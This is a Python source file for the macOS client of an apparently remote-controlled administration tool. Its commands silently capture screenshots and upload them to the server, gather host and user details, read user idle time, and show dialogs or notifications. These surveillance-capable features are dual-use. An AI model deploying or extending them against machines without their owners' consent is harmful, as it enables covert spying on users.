import os
import subprocess
import sys
import time

from client.commands.argument_command_registry import (
    ArgumentCommandSpec,
    ArgumentOptionSpec,
    argument_command,
)
from client.commands.common import CommonCommands
from core.utils.decorator import desc
from core.utils.formatting import get_time, format_dict
from core.utils.logger import logger


MSGBOX_ARGUMENT_SPEC = ArgumentCommandSpec(
    name='msgbox',
    description='Show a native macOS dialog',
    options=[
        ArgumentOptionSpec(name='title', option_type='str', required=False, default='', allow_empty=True, help_text='Dialog title'),
        ArgumentOptionSpec(name='text', option_type='str', required=True, default=None, allow_empty=False, help_text='Dialog text'),
        ArgumentOptionSpec(name='timeout', option_type='int', required=False, default=None, help_text='Auto close timeout in seconds'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False, help_text='Show this help message'),
    ]
)

NOTIFY_ARGUMENT_SPEC = ArgumentCommandSpec(
    name='notify',
    description='Show a native macOS notification',
    options=[
        ArgumentOptionSpec(name='title', option_type='str', required=False, default='', allow_empty=True, help_text='Notification title'),
        ArgumentOptionSpec(name='text', option_type='str', required=True, default=None, allow_empty=False, help_text='Notification text'),
        ArgumentOptionSpec(name='sound', option_type='flag', required=False, default=False, help_text='Play the default notification sound'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False, help_text='Show this help message'),
    ]
)


class MacCommands(CommonCommands):
    """macOS 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)

    def _run_command_text(self, command: str) -> str:
        try:
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, text=True, encoding='utf-8', errors='replace')
            if result.returncode != 0:
                return ''
            return (result.stdout or '').strip()
        except Exception:
            return ''

    def _build_process_info(self):
        import platform
        import psutil

        process = psutil.Process()
        executable_path = os.path.realpath(sys.executable)
        script_path = os.path.realpath(''.join(sys.argv))

        return {
            'hostname': platform.node(),
            'macos_version': platform.mac_ver()[0],
            'build_version': self._run_command_text('sw_vers -buildVersion'),
            'architecture': platform.machine(),
            'hardware_model': self._run_command_text('sysctl -n hw.model'),
            'cpu_brand': self._run_command_text('sysctl -n machdep.cpu.brand_string'),
            'cpu_cores': os.cpu_count(),
            'memory': f'{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB',
            'python_version': platform.python_version(),
            'process_id': os.getpid(),
            'current_user': process.username(),
            'launch_command': f'{executable_path} {script_path}',
            'process_uptime': f'{round(time.time() - process.create_time(), 2)}s',
            'cwd': os.getcwd()
        }

    def _escape_osascript_text(self, value: str) -> str:
        text = str(value or '')
        text = text.replace('\\', '\\\\')
        text = text.replace('"', '\\"')
        return text

    def _spawn_osascript(self, applescript: str):
        return subprocess.Popen(['osascript', '-e', applescript], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

    @desc("Capture a screenshot", group='platform')
    def screenshot(self):
        screenshot_path = f'screenshot_{get_time()}.png'
        capture_command = f'screencapture -x {screenshot_path}'

        try:
            self._send_interim_result(1, f'Capturing screen: {capture_command}')
            result = self._run_shell_command(capture_command, timeout=15)
            if result.returncode != 0:
                return 0, result.stderr or 'Failed to capture screenshot'

            self._send_interim_result(1, 'Screenshot captured successfully', 0)
            return self._upload_single_file_to_server_result(screenshot_path, category='downloads')
        except subprocess.TimeoutExpired:
            return 0, 'Screenshot capture timed out and was terminated'
        except Exception as e:
            return 0, f'Failed to capture screenshot: {e}'
        finally:
            if os.path.isfile(screenshot_path):
                try:
                    os.remove(screenshot_path)
                except Exception:
                    pass

    @desc('Show system information', group='platform')
    def getinfo(self):
        try:
            return 1, format_dict(self._build_process_info())
        except Exception as e:
            logger.error(e, exc_info=True)
            return 0, f'Failed to collect system information: {e}'

    @desc('Show user idle time', group='platform')
    def idletime(self):
        try:
            from Quartz import CGEventSourceSecondsSinceLastEventType, kCGEventSourceStateHIDSystemState, kCGAnyInputEventType
            idle_seconds = CGEventSourceSecondsSinceLastEventType(kCGEventSourceStateHIDSystemState, kCGAnyInputEventType)
            return 1, f'User idle time: {idle_seconds:.2f} seconds'
        except Exception as e:
            return 0, f'Failed to read idle time: {e}'

    @argument_command('msgbox', spec=MSGBOX_ARGUMENT_SPEC)
    def _acmd_msgbox(self, args_dict, payload=None):
        try:
            title = args_dict.get('title', '')
            text = args_dict['text']
            timeout = args_dict.get('timeout')
            escaped_text = self._escape_osascript_text(text)
            escaped_title = self._escape_osascript_text(title)
            applescript = f'display dialog "{escaped_text}" with title "{escaped_title}" buttons {{"OK"}} default button "OK"'
            if timeout is not None and timeout > 0:
                applescript += f' giving up after {timeout}'
            process = self._spawn_osascript(applescript)
            return 1, f'Message box launched asynchronously: {title or "(no title)"}\nPID: {process.pid}'
        except Exception as e:
            return 0, f'Failed to launch message box: {e}'

    @argument_command('notify', spec=NOTIFY_ARGUMENT_SPEC)
    def _acmd_notify(self, args_dict, payload=None):
        try:
            title = args_dict.get('title', '')
            text = args_dict['text']
            sound = args_dict.get('sound', False)
            escaped_text = self._escape_osascript_text(text)
            escaped_title = self._escape_osascript_text(title)
            applescript = f'display notification "{escaped_text}"'
            if escaped_title:
                applescript += f' with title "{escaped_title}"'
            if sound:
                applescript += ' sound name "default"'
            process = self._spawn_osascript(applescript)
            return 1, f'Notification launched asynchronously: {title or "(no title)"}\nPID: {process.pid}'
        except Exception as e:
            return 0, f'Failed to launch notification: {e}'
